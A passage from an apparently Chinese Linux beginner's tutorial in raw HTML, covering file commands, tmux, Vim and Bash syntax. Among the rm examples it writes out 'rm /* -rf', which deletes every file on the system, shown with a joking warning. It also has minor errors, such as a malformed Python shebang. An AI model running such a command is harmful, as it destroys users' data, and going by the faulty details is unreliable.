class="code"><pre><span class="line">eg:</span><br><span class="line">mkdir /home/acs/a/b (在根目录下创建文件)</span><br><span class="line">mkdir a/b/c -p (在该文件夹下创建a/b/c复合文件)</span><br></pre></td></tr></table></figure><p><code>history</code>: 显示历史用过的指令;</p><p><code>rm</code>: 删除,<br><code>rm xxx</code>: 删除某一文件;<br><code>rm xxx -r</code>: 删除某文件夹;(支持正则表达式);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">rm tmp.txt tmp2.txt (删除tmp.txt和tmp2.txt)</span><br><span class="line">rm .txt (删除所有txt文件)</span><br><span class="line">rm a/ (删除a里面所有东西)</span><br><span class="line">rm /* -rf (删除系统所有文件)不要乱敲哦~</span><br></pre></td></tr></table></figure><blockquote><p>windows彻底删除文件:Shift + Delete;</p></blockquote><p><code>mv</code>: mv xxx yyy (剪切+ 粘贴)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">mv a/tmp.txt b/ (将a中tmp.txt文件挪到b文件夹里面)</span><br><span class="line">mv b/tmp.txt a/tmp2.txt (将b中tmp.txt文件挪到a文件夹里面并重命名为tmp2.txt)</span><br><span class="line">mv tmp2.txt tmp.txt (将tmp2.txt重命名为tmp.txt)</span><br></pre></td></tr></table></figure><blockquote><p>cp与mv区别:cp(复制+粘贴), mv(剪切+粘贴)<br>mkdir与touch区别:mkdir(创建文件夹), touch(创建文件)</p></blockquote><p><code>cat</code>: cat xxx(查看xxx文件);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">cat a/tmp.cpp(查看tmp.cpp文件)</span><br></pre></td></tr></table></figure><h2 id="tmux与vim">tmux与Vim</h2><p>开发时经常使用的两大编辑工具</p><h3 id="tmux">tmux</h3><p><strong>功能</strong></p><p>分屏：可以在一个开发框里分屏<br>允许terminal在连接断开之后可以继续运行，让进程不会因为断开连接而中断</p><blockquote><p>tmux结构为session-&gt;window-&gt;pane\</p></blockquote><p><strong>操作</strong></p><p>1).切分：<br>竖直切分：先按<code>ctrl+b</code>松开，再输入<code>%</code><br>水平切分：先按<code>ctrl+b</code>，再按<code>”</code></p><p>当按下<code>ctrl+d</code>，可以关闭tmux<br>对于切分来说，每一块都可以继续切分</p><p>2).退出：<br><code>ctrl+d</code> 退出<br>当window没有pane时，自动退出<br>当session没有window时，自动退出<br>故一直<code>ctrl+d</code>下去会直接退出</p><p>3).选择pane：鼠标点击即可或输入<code>ctrl+b</code>，然后按<code>方向键</code>选择相邻的pane</p><p>4).调整分割线：选中并拖动即可或者<code>ctrl+b</code><strong>同时</strong>按方向键</p><p>5).全屏与取消全屏：某个窗口全屏：选中并按下<code>ctrl+b</code>再按<code>z</code><br>同样取消按ctrl+A再按z</p><p>6).挂起窗口：<code>ctrl+b</code>然后按<code>d</code>，此为从session中退出<br>输入<code>tmux a </code>或<code>tmux attach</code>，再开启session窗口</p><p>7).选择其他的session：先进入tmux，然后在tmux里输入<code>ctrl+b</code>再按<code>s</code><br>再session里的方向键操作：<br><code>→</code>展开，<code>→</code>再按一次是展开所有pane <code>←</code>按下是合上所有pane<br><code>↑↓</code>选择session</p><p>8).session中创建window与选择window：<code>ctrl+b</code>再按<code>c</code>：创建window<br><code>ctrl+b</code>再按w：选择其他window也可以展开合上每个window</p><blockquote><p><code>ctrl+b+s</code>与<code>ctrl+b+w</code>的区别:前者打开只展开session一级，后者展示session级中所有的window，一般习惯于每个session中只含有一个window</p></blockquote><p>9).翻阅内容：<code>↑</code>滚轮向上<br>或者<code>ctrl+b</code>再按<code>Pageup</code>向上翻，按<code>PageUp</code>向下翻</p><p>10).从tmux中复制文本：<br>按住<code>shift</code>键选择文本<br><code>ctrl+insert</code>复制<br><code>shift+insert</code>粘贴</p><h3 id="vim">vim</h3><p><strong>功能</strong></p><p>1.命令行模式下的文本编辑器<s>终极记事本</s><br>2.根据扩展名判别编程语言，实现代码缩进、代码高亮</p><p><strong>使用</strong></p><p><code>vim filename</code><br>如果有该文件则打开<br>没有则打开一个新的文件，命名为filename</p><p><strong>三种模式</strong></p><p>1.一般命令模式/默认模式：无法编写，输入命令，每一个命令对应一个字母，支持复制粘贴删除文本<br>2.编辑模式：在默认模式下按<code>i</code>，进入编辑模式，按<code>esc</code>退出<br>3.命令行模式：默认模式下按<code>:/？</code>三个中任意一个进入命令行模式，命令行在最下方，支持查找、替换、保存、退出、配置编辑器等</p><p><strong>操作</strong><br>1.<code>i</code>：进入编辑模式(底部出现insert)</p><p>2.<code>esc</code>：进入一般命令模式</p><p>3.小键盘可以操作前后左右</p><p>4.光标的移动操作：<code>n+&lt;Space&gt;</code> n是数字，光标会自动右移n个字符<br>一般命令模式下：<code>0/home</code> 将光标移动到本行开头<br><code>$/End</code>将光标移动到本行结尾<br><code>G</code>:光标移动到最后一行</p><p>5.具体到哪一行的操作：<br>1).<code>n/nG</code>:表示想去具体到哪一行（n是到某一行的下面，nG是直达）<br>2).<code>gg</code>:到达第一行<br>3).<code>n+&lt;Enter&gt;</code> 向下跳n行</p><p>6.查找与修改字符串的操作：<br>1).<code>/word</code>:在命令行模式下，光标之下寻找第一个值为word的字符串<br>2).<code>?word</code>:在光标之上第一个值为word的字符串<br>3).<code>n</code>:重复前一个查找操作<br>4).<code>N</code>:反向查找，也就是说前一个命令向前找，此命令下向后找<br>5).<code>:n1,n2s/word1/word2/g</code>:n1,n2为数字，在第n1与n2之间找word1，并替换为word2<br><code>:1,$s/word1/word2/g</code>: 将全文的word1换成word2<br><code>:1,$s/word1/word2/gc</code>:在每一次替换的时候都会让用户进行确认</p><p>7.<code>:noh</code> 关闭所查找的关键词的高亮</p><p>8.选中与删除<br><code>v</code>:选中文本,按两下esc取消<br><code>d</code>:删除选中文本(其实有剪切的特性)<br><code>dd</code>:删除整行</p><p>9.复制与粘贴：<br><code>y</code>:复制(文本)<br><code>p</code>:在光标所处位置的下一行或下一个位置(通常当光标在两边时)粘贴<br><code>yy</code>:复制当前行</p><p>10.撤销:<code>u</code>:撤销<br><code>ctrl+r</code>:取消撤销</p><blockquote><p>在windows里，ctrl+z撤销，ctrl+shift+z取消撤销</p></blockquote><p>11.<code>&gt; </code>将选中的文本整体向右移动<br><code>&lt;</code> 将选中的文本整体向左移动</p><p>12.保存与退出：<br><code>:w</code>保存<br><code>:w! </code>强制保存</p><p>一般命令模式下:按下<code>ESC</code>，按<code>q</code>退出<br><code>:q!</code> 强制退出（不保存）<br><code>:wq</code> 保存并退出<br><code>:wq!</code> 强制保存退出</p><p>13.行号的显示与隐藏:<br><code>:set nonu</code> 隐藏行号<br><code>:set nu</code> 显示行号</p><p>14.paste模式:<br>当要粘贴过来的代码很长时，命令可能会失效，占用很大带宽，导致出现多重缩进<br><code>:set paste</code>取消代码缩进，设置成粘贴模式<br><code>:set nopaste</code>开启代码缩进</p><p>15.其他组合命令<br><code>gg+d+G</code> 删除全部内容<br><code>gg=G</code> 将全文格式化</p><p>其他补充tips：</p><blockquote><p>ctrl+q:当vim卡死时，可取消当前正在执行的命令</p><p>异常处理:当前进程出现冲突时，会出现异常(如在令一终端中用vim打开已经打开的文件)<br>解决方法：1).找到正在多个打开的文件程序，并关掉，保证同一个进程只有同一个文件能打开<br>2).问题：当一个进程不小心被其他进程杀掉，当再打开main.cpp时，此时如果出现一个<code>.swp</code>缓存文件时会报错<br>解决：在没有任何一个进程打开该文件时，将<code>.swp</code>文件删掉即可</p></blockquote><h2 id="shell语法">Shell语法</h2><h3 id="概论">概论</h3><p>Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。<br>Shell 既是一种命令语言，又是一种程序设计语言。<br>Shell 是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务</p><p>Linux的Shell脚本语言分为多种，如Bourne Shell(<code>/usr/bin/sh或/bin/sh</code>)、Bourne Again Shell(<code>/bin/bash</code>)、C Shell(<code>/usr/bin/csh</code>)、K Shell(<code>/usr/bin/ksh</code>)、zsh等等，本文讲解的为bash语法</p><p>文件开头需要写<code>#! /bin/bash</code>，指明bash为脚本解释器。同理如果是python的话开头要写<code>#! /usr/env/ python</code></p><p>学习Shell语言可以看成是学习一门新的语言，先从<code>hello,world</code>写起</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/bash</span></span><br><span class="line">echo &quot;Hello World!&quot;</span><br></pre></td></tr></table></figure><p><strong>运行方式</strong></p><p>1.用bash解释器运行 <code>bash test.sh</code></p><p>2.赋予脚本文件可执行权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x test.sh  # 使脚本具有可执行权限</span><br><span class="line">./test.sh </span><br></pre></td></tr></table></figure><blockquote><p><code>chmod</code>指令用于为文件赋予权限，一般r、w、x分别为可读、可写、可执行</p></blockquote><p><img src="https://s2.loli.net/2023/11/17/aLtl4dbenyIvDpS.png" alt="添加权限后变为绿色"></p><h3 id="注释">注释</h3><p><strong>单行注释</strong>（和python类似）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这是一行注释</span></span><br><span class="line">echo &#x27;Hello World&#x27;  #  这也是注释</span><br></pre></td></tr></table></figure><p><strong>多行注释</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:&lt;&lt;EOF</span><br><span class="line">第一行注释</span><br><span class="line">第二行注释</span><br><span class="line">第三行注释</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><blockquote><p>其中<code>EOF</code>可以换成其它任意字符串。例如：<code>abc</code>、<code>!</code></p></blockquote><h3 id="变量">变量</h3><p>tips：<br>1、定义变量时，等号两边不能有空格<br>2、定义变量的时候变量都是字符串，但当变量需要是整数时，会自动把变量转换成整数<br>3、<code>type+命令</code>可以解释该命令的来源（内嵌命令。第三方命令等）<br>如<code>type readonly #readonly is a shell builtin(shell内部命令)</code><br><code>type ls # ls is aliased to ‘ls –color+auto’</code><br>4、被声明为只读的变量无法被unset删除<br>5、bash可以用来开一个新的进程，exit或Ctrl+d退出新的bash<br>6、字符串中，不加引号和双引号效果相同</p><p><strong>定义变量</strong><br>定义变量，不需要加<code>$</code>符号，例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name1=&#x27;byf&#x27;  # 单引号定义字符串</span><br><span class="line">name2=&quot;byf&quot;  # 双引号定义字符串</span><br><span class="line">name3=byf    # 也可以不加引号，同样表示字符串</span><br></pre></td></tr></table></figure><p><strong>使用变量</strong></p><p>使用变量，需要加上 <code>$ </code>符号，或者<code> $&#123;&#125;</code> 符号。花括号是可选的，主要为了帮助解释器识别变量边界。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name=Oracle</span><br><span class="line">echo $name  # 输出Oracle</span><br><span class="line">echo $&#123;name&#125;  # 输出Oracle</span><br><span class="line">echo $&#123;name&#125;nb  # 输出Oraclenb</span><br></pre></td></tr></table></figure><p><strong>只读变量</strong></p><p>使用<code>readonly</code>或者 <code>declare</code>可以将变量变为只读。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name=Oracle</span><br><span class="line">readonly name</span><br><span class="line">declare -r name  # 两种写法均可</span><br><span class="line"></span><br><span class="line">name=abc  # 会报错，因为此时name只读</span><br></pre></td></tr></table></figure><p><strong>删除变量</strong></p><p><code>unset</code> 可以删除变量。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=Oracle</span><br><span class="line">unset name</span><br><span class="line">echo $name  # 输出空行</span><br></pre></td></tr></table></figure><p><strong>变量类型</strong></p><p>1.自定义变量（局部变量） 子进程不能访问的变量<br>2.环境变量（全局变量） 子进程可以访问的变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">自定义变量改成环境变量</span></span><br><span class="line">name=Oracle</span><br><span class="line">export name # 第一种方法</span><br><span class="line">declare -x name # 第二种方法</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">环境变量改为自定义变量</span></span><br><span class="line">export name=Oracle</span><br><span class="line">declare +x name  # 改为自定义变量</span><br></pre></td></tr></table></figure><p><strong>字符串</strong></p><p>字符串可以用单引号，也可以用双引号，也可以不用引号。</p><p>单引号与双引号的区别：<br>1.单引号中的内容会原样输出，不会执行、不会取变量<br>2.双引号中的内容可以执行、可以取变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name=Oracle  # 不用引号</span><br><span class="line">echo &#x27;hello, $name \&quot;hh\&quot;&#x27;  # 单引号字符串，输出 hello, $name \&quot;hh\&quot;</span><br><span class="line">echo &quot;hello, $name \&quot;hh\&quot;&quot;  # 双引号字符串，输出 hello, Oracle &quot;hh&quot;</span><br><span class="line">echo hello, $name \&quot;hh\&quot;  # 不加括号，与双引号输出相同</span><br></pre></td></tr></table></figure><p>获取字符串长度</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=&quot;Oracle&quot;</span><br><span class="line">echo $&#123;#name&#125;  # 输出6</span><br></pre></td></tr></table></figure><p>提取子串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=&quot;hello,Oracle&quot;</span><br><span class="line">echo $&#123;name:6:12&#125; # Oracle</span><br></pre></td></tr></table></figure><h3 id="默认变量">默认变量</h3><p>文件参数变量<br>在执行 <code>shell</code> 脚本时，可以向脚本传递参数。</p><p><code>$1 </code>是第一个参数，<code>$2</code> 是第二个参数，以此类推。特殊的，<code>$0</code> 是文件名（包含路径）。输入绝对路径就显示绝对路径，输入相对路径就显示相对路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/bash</span></span><br><span class="line"></span><br><span class="line">echo &quot;文件名：&quot;$0</span><br><span class="line">echo &quot;第一个参数：&quot;$1</span><br><span class="line">echo &quot;第二个参数：&quot;$2</span><br><span class="line">echo &quot;第三个参数：&quot;$3</span><br><span class="line">echo &quot;第四个参数：&quot;$4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">文件名：./test.sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一个参数：1</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第二个参数：2</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第三个参数：3</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第四个参数：4</span></span><br></pre></td></tr></table></figure><p>其他默认变量</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>$#</code></td><td>代表文件传入的参数个数</td></tr><tr><td><code>$*</code></td><td>由所有参数构成的用空格隔开的字符串</td></tr><tr><td><code>$@</code></td><td>每个参数分别用双引号括起来的字符串</td></tr><tr><td><code>$$</code></td><td>脚本当前运行的进程ID</td></tr><tr><td><code>$?</code></td><td>上一条命令的退出状态（注意不是<code>stdout</code>，而是<code>exit code</code>）。0表示正常退出，其他值表示错误</td></tr><tr><td><code>$(command)</code></td><td>返回<code>command</code>这条命令的<code>stdout</code>（可嵌套）</td></tr><tr><td><code>command</code></td><td>返回<code>command</code>这条命令的<code>stdout</code>（不可嵌套）</td></tr></tbody></table><h3 id="数组">数组</h3><p>定义：数组用小括号表示，元素之间用空格隔开。数组下标从0开始</p><p>也可以直接定义数组中某个元素的值：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array=(1 byf oracle 20)</span><br><span class="line"></span><br><span class="line">array[0]=1</span><br><span class="line">array[1]=byf</span><br><span class="line">array[2]=&quot;oracle&quot;</span><br><span class="line">array[3]=20</span><br></pre></td></tr></table></figure><p>读取数组中某个元素的值格式为<code>$&#123;array[index]&#125;</code></p><p>读取整个数组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;array[@]&#125;  <span class="comment"># 第一种写法</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;array[*]&#125;  <span class="comment"># 第二种写法</span></span></span><br></pre></td></tr></table></figure><p>输出数组长度</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;<span class="comment">#array[@]&#125;  # 第一种写法</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;<span class="comment">#array[*]&#125;  # 第二种写法</span></span></span><br></pre></td></tr></table></figure><blockquote><p>在读取整个数组或获取数组长度时，未定义的部分就不会显示。</p></blockquote><h3 id="expr命令">expr命令</h3><p>用于求表达式的值<code>expr 3 + 4 # 7</code></p><blockquote><p>expr可以用<code>$()</code>和``取返回值</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str=&quot;Hello World!&quot;</span><br><span class="line">echo $(expr length &quot;$str&quot;)</span><br></pre></td></tr></table></figure><p>表达式说明：</p><ol><li>用空格隔开每一项</li><li>用反斜杠放在shell特定的字符前面（发现表达式运行错误时，可以试试转义）</li><li>对包含空格和其他特殊字符的字符串要用引号括起来</li><li>expr会在 <code>stdout</code>中输出结果。如果为逻辑关系表达式，则结果为真，<code>stdout </code>为 1，否则为 0。</li><li>expr的 <code>exit code</code> ：如果为逻辑关系表达式，则结果为真，<code>exit code</code> 为0 ，否则为 1。</li></ol><p><strong>字符串表达式</strong></p><p><code>length STRING</code>  : 返回STRING的长度 (汉字长度为3)<br><code>index STRING CHARSET</code> : <code>CHARSET</code> 中任意单个字符在 <code>STRING</code> 中最前面的字符位置，下标从1 开始。 如果在<code> STRING</code> 中完全不存在 <code>CHARSET</code> 中的字符，则返回0。（这里需要与字符串变量做区别，字符串变量下标是从0开始的）<br><code>substr STRING POSITION LENGTH </code>: 返回 <code>STRING </code>字符串中从<code>POSITION</code> 开始，长度最大为 <code>LENGTH</code> 的子串。 如果 <code>POSITION</code> 或 <code>LENGTH</code> 为负数，0 或非数值，则返回空字符串。(字符串下标从1开始，字符串变量的求子串下标从0开始)<br>示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str=&quot;Hello World!&quot;</span><br><span class="line"></span><br><span class="line">echo `expr length &quot;$str&quot;`  # 输出12</span><br><span class="line">echo `expr index &quot;$str&quot; aWd`  # 输出7，下标从1开始</span><br><span class="line">echo `expr substr &quot;$str&quot; 2 3`  # 输出 ell</span><br></pre></td></tr></table></figure><p><strong>整数表达式</strong></p><p><code>expr </code>支持普通的算术操作，算术表达式优先级低于字符串表达式，高于逻辑关系表达式。</p><blockquote><p>注意：所有运算符号与变量或数字之间都要用空格隔开，否则将会被识别成字符串</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=2</span><br><span class="line">b=3</span><br><span class="line">echo $(expr $a+$b) # 2+3</span><br><span class="line">echo $(expr $a + $b) #5</span><br></pre></td></tr></table></figure><blockquote><p>加减, 乘，除，取模运算运算。两端参数会转换为整数，如果转换失败则报错。</p><p>() 可以该表优先级，但需要用反斜杠转义</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=3</span><br><span class="line">b=4</span><br><span class="line"></span><br><span class="line">echo `expr $a + $b`  # 输出7</span><br><span class="line">echo `expr $a - $b`  # 输出-1</span><br><span class="line">echo `expr $a \* $b`  # 输出12，*需要转义</span><br><span class="line">echo `expr $a / $b`  # 输出0，整除</span><br><span class="line">echo `expr $a % $b` # 输出3</span><br><span class="line">echo `expr \( $a + 1 \) \* \( $b + 1 \)`  # 输出20，值为(a + 1) * (b + 1)</span><br></pre></td></tr></table></figure><p><strong>逻辑关系表达式(需要用单引号’'或者\将运算符号转义)</strong></p><p><code>| </code>如果第一个参数非空且非0，则返回第一个参数的值，否则返回第二个参数的值，但要求第二个参数的值也是非空或非0，否则返回0。如果第一个参数是非空或非0时，不会计算第二个参数。（<strong>短路原则</strong>：当前面的表达式为1时，就不用计算后面的表达式了）</p><p><code>&amp; </code>如果两个参数都非空且非0，则返回第一个参数，否则返回0。如果第一个参为0或为空，则不会计算第二个参数。（<strong>短路原则</strong>：当前面的表达式为0，时就不用计算后面的表达式了，若都为0则返回前面表达式的值）</p><p><code>&lt;</code> <code>&lt;=</code> <code>=</code> <code>==</code> <code>!=</code> <code>&gt;=</code> <code>&gt;</code>比较两端的参数，如果为true，则返回1，否则返回0。”==”是”=”的同义词。”expr”首先尝试将两端参数转换为整数，并做算术比较，如果转换失败，则按字符集排序规则做字符比较。<br><code>()</code> 可以该表优先级，但需要用反斜杠转义</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a=3</span><br><span class="line">b=4</span><br><span class="line"></span><br><span class="line">echo `expr $a \&gt; $b`  # 输出0，&gt;需要转义</span><br><span class="line">echo `expr $a &#x27;&lt;&#x27; $b`  # 输出1，也可以将特殊字符用引号引起来</span><br><span class="line">echo `expr $a &#x27;&gt;=&#x27; $b`  # 输出0</span><br><span class="line">echo `expr $a \&lt;\= $b`  # 输出1</span><br><span class="line"></span><br><span class="line">c=0</span><br><span class="line">d=5</span><br><span class="line"></span><br><span class="line">echo `expr $c \&amp; $d`  # 输出0</span><br><span class="line">echo `expr $a \&amp; $b`  # 输出3</span><br><span class="line">echo `expr $c \| $d`  # 输出5</span><br><span class="line">echo `expr $a \| $b`  # 输出3</span><br></pre></td></tr></table></figure><h3 id="read命令">read命令</h3><p><code>read</code> 命令用于从标准输入中读取单行数据。当读到文件结束符时，<code>exit code</code> 为 1 ，否则为0 。</p><p>参数说明:<br><code>-p</code> : 后面可以接提示信息<br><code>-t</code> ：后面跟秒数，定义输入字符的等待时间，超过等待时间后会自动忽略此命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/bash</span></span><br><span class="line">read name</span><br><span class="line">echo &quot;hello,$name&quot;</span><br></pre></td></tr></table></figure><h3 id="echo命令">echo命令</h3><p><code>echo</code> 用于输出字符串。命令格式：<code>echo STRING</code></p><p><strong>显示普通字符串</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Hello world&quot;</span><br><span class="line">echo Hello world  # 引号可以省略</span><br></pre></td></tr></table></figure><p><code>-e</code>参数功能为打开特殊字符转义功能<br><code>\\ \a \b \c \d \e \f \n \r \t \v</code> 这些是要在有 <code>- e</code> 的时候才能起作用, 其他时候的转义是不用<code>- e</code>也能转义的。</p><p><strong>显示转义字符</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;\&quot;Hello world\&quot;&quot;  # 注意只能使用双引号，如果使用单引号，则不转义</span><br><span class="line">echo \&quot;Hello world\&quot;  # 也可以省略双引号</span><br></pre></td></tr></table></figure><p><strong>显示变量</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=oracle</span><br><span class="line">echo &quot;My name is $name&quot;  # 输出 My name is oracle</span><br></pre></td></tr></table></figure><p><strong>显示不换行</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;Hi \c&quot; # -e 开启转义 \c 不换行</span><br><span class="line">echo &quot;Oracle&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出结果</span></span><br><span class="line">Hi Oracle</span><br></pre></td></tr></table></figure><p><strong>显示结果定向至文件</strong></p><p><code>echo &quot;Hello World&quot; &gt; output.txt</code>  将内容以覆盖的方式输出到output.txt中</p><p><strong>原样输出字符串，不进行转义或取变量(用单引号)</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name=oracle</span><br><span class="line">echo &#x27;$name\&quot;&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出结果 <span class="variable">$name</span>\&quot;</span></span><br></pre></td></tr></table></figure><p><strong>显示命令的执行结果</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo `date`</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出结果 Wed Sep 1 11:45:33 CST 2021</span></span><br></pre></td></tr></table></figure><h3 id="printf命令">printf命令</h3><p><code>printf</code> 命令用于格式化输出，类似于 C/C++ 中的 <code>printf</code> 函数。</p><p>默认不会在字符串末尾添加换行符。</p><p>命令格式：</p><p><code>printf format-string [arguments...]</code><br>用法示例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf &quot;%10d!\n&quot; 123  # 占10位，右对齐</span><br><span class="line">printf &quot;%-10.2f.\n&quot; 123.123321  # 占10位，保留2位小数，左对齐</span><br><span class="line">printf &quot;My name is %s\n&quot; &quot;oracle&quot;  # 格式化输出字符串</span><br><span class="line">printf &quot;%d * %d = %d\n&quot;  2 3 `expr 2 \* 3` # 表达式的值作为参数</span><br></pre></td></tr></table></figure><h3 id="test命令与判断符号">test命令与判断符号[]</h3><h1>旧版</h1><blockquote><p>本文使用Linux版本为CentOS-7-x86_64-DVD-2009</p></blockquote><p>为方便，学习Linux前先了解ssh远程连接<br>需要配备环境：Linux虚拟机、Xshell<br>打开虚拟机终端，<code>ip address show</code>查看IP，用XShell链接即可<br>退出Linux会话：<code>exit</code>或<code>logout</code><br>连接：Xshell或ssh命令（在客户端操作）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[E:\~]$ ssh</span><br><span 